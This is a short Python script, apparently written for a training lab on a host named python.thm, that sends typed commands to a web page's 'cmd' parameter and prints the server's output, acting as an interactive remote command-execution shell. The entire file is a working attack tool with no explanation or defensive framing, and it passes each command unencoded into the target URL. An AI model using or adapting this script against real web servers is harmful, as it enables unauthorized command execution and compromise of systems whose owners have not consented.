#!/usr/bin/python3

import requests
from colorama import Fore
import pyfiglet 

font = pyfiglet.figlet_format('Basic Exploit')
print(Fore.CYAN+font)

target_url = "http://python.thm/labs/lab3/execute.php?cmd="

session =requests.session()

print("[+] Interactive Exploit Shell")
while True:
	cmd = input("[~] Shell > ")
	if cmd.lower() in ["exit", "quit"]:
        	break
        
	try:
		response = session.get(target_url + cmd)
		
		if response.status_code == 200:
			print(response.text)
		else:
			print(f"[-] Exploit failed with status code: {response.status_code}")
	except:
		print("[!] Issue with Target URL or request")
		print("[!] Usage: ./basic-exploit.py http://target-url/execute.php?cmd=")
		print("[!] CHECK YOUR URL!")